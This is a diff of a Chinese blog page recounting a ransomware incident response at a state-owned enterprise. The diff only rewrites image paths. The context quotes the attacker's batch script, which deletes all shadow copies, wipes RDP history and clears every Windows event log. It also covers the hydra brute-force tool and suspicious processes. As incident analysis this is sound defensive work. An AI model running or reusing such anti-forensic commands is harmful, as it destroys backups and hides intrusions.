@@ -85,20 +85,20 @@
 <meta property="og:site_name" content="HexChristmas&#39;s Blog">
 <meta property="og:description" content="某国企上午来突然接到通知，总部中了勒索病毒，一次勒索病毒的应急响应">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://hexchristmas.github.io/p/2.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/1.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/3.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/5.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/6.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/4.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/9.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/8.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/7.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6b6e/2.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6b6e/1.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6b6e/3.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6b6e/5.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6b6e/6.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6b6e/4.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6b6e/9.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6b6e/8.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6b6e/7.png">
 <meta property="og:updated_time" content="2020-06-15T11:48:23.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="某国企勒索病毒应急响应">
 <meta name="twitter:description" content="某国企上午来突然接到通知，总部中了勒索病毒，一次勒索病毒的应急响应">
-<meta name="twitter:image" content="https://hexchristmas.github.io/p/2.png">
+<meta name="twitter:image" content="https://hexchristmas.github.io/p/6b6e/2.png">
 
 
 
@@ -412,28 +412,28 @@
 <p>这些机器都是由另一位安服同志排查的，所以后来情况也没和我同步，诶，所以我就不清楚了</p>
 <h3 id="确定感染时间">确定感染时间</h3>
 <p>勒索感染时间为早上5:27分<br>
-<img src="//hexchristmas.github.io/p/2.png" alt></p>
+<img src="/p/6b6e/2.png" alt></p>
 <h3 id="感染后缀名">感染后缀名</h3>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C4H</span><br></pre></td></tr></table></figure>
 <h3 id="解密联系方式">解密联系方式</h3>
-<p><img src="//hexchristmas.github.io/p/1.png" alt></p>
+<p><img src="/p/6b6e/1.png" alt></p>
 <h3 id="敏感目录文件">敏感目录文件</h3>
 <p>我们在用户的<strong>temp</strong>目录下发现了一个名称叫做<strong>tmp61DD.tmp.bat</strong>的<strong>bat</strong>文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">vssadmin.exe Delete Shadows /All /Quiet</span><br><span class="line">reg delete <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"</span> /va /f</span><br><span class="line">reg delete <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"</span> /f</span><br><span class="line">reg add <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"</span></span><br><span class="line"><span class="built_in">cd</span> %userprofile%\documents\</span><br><span class="line">attrib Default.rdp -s -h</span><br><span class="line">del Default.rdp</span><br><span class="line"><span class="keyword">for</span> /F <span class="string">"tokens=*"</span> %1 <span class="keyword">in</span> (<span class="string">'wevtutil.exe el'</span>) DO wevtutil.exe cl <span class="string">"%1"</span>%</span><br></pre></td></tr></table></figure>
 <p>在<strong>C:\Users\lazy\Videos&gt;<strong>目录下发现了黑客爆破的工具</strong>hydra</strong>,NS估计也是黑客的工具，但是被加密了也分析不出来<br>
-<img src="//hexchristmas.github.io/p/3.png" alt></p>
+<img src="/p/6b6e/3.png" alt></p>
 <h3 id="进程分析">进程分析</h3>
 <p>我们祭出了<strong>AutoRuns</strong>,<strong>ProcessExplorer</strong>,<strong>ProcessMonitor</strong>,这三个工具应该是我们应急的过程中常用的三剑客，其实火绒剑就足够了，但是不太喜欢用这个<br>
 我们用<strong>autoruns</strong>发现了一个很可疑的东西，就是暴风一键激活的工具，而且2016年就有了，这就很可能构成APT，但是甲方不太重视这里边我们忽略后边在说<br>
-<img src="//hexchristmas.github.io/p/5.png" alt><br>
+<img src="/p/6b6e/5.png" alt><br>
 用<strong>ProcessExplorer</strong>发现这个终端一直在请求一个矿池和勒索的IP，那个截图我找不到了<br>
-<img src="//hexchristmas.github.io/p/6.png" alt><br>
+<img src="/p/6b6e/6.png" alt><br>
 我们从注册表中看到<br>
-<img src="//hexchristmas.github.io/p/4.png" alt><br>
+<img src="/p/6b6e/4.png" alt><br>
 然后，我们在进程中嗨发现iexplore.exe这个程序也不对劲，疑似是dll劫持，截图找不到了<br>
-<img src="//hexchristmas.github.io/p/9.png" alt><br>
+<img src="/p/6b6e/9.png" alt><br>
 于是我把所有程序都丢到<strong>virustotal</strong>,发现确实有问题，<br>
-<img src="//hexchristmas.github.io/p/8.png" alt><br>
+<img src="/p/6b6e/8.png" alt><br>
 然后我们发现这个勒索的命名都非常奇怪，叫做</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$360Honeypot</span><br><span class="line">$360LockFile</span><br></pre></td></tr></table></figure>
 <p>有没有觉得很熟悉？DLP(数据防泄漏？)这黑客竟然以这个命名，我觉得十分的奇怪，不深究了</p>
@@ -443,7 +443,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 对系统进行补丁更新，封堵病毒传播途径；</span><br><span class="line">2. 制定严格的口令策略，避免弱口令；</span><br><span class="line">3. 结合备份的网站日志对网站应用进行全面代码审计，找出攻击者利用的漏洞入口进行封堵；</span><br><span class="line">4. 配合全流量设备对全网中存在的威胁进行分析，排查问题；</span><br></pre></td></tr></table></figure>
 <h3 id="样本取证">样本取证</h3>
 <p>取证的样本大概就是这样<br>
-<img src="//hexchristmas.github.io/p/7.png" alt></p>
+<img src="/p/6b6e/7.png" alt></p>
 <h2 id="根除阶段">根除阶段</h2>
 <p>重装系统</p>
 <h2 id="相关安全建议">相关安全建议</h2>
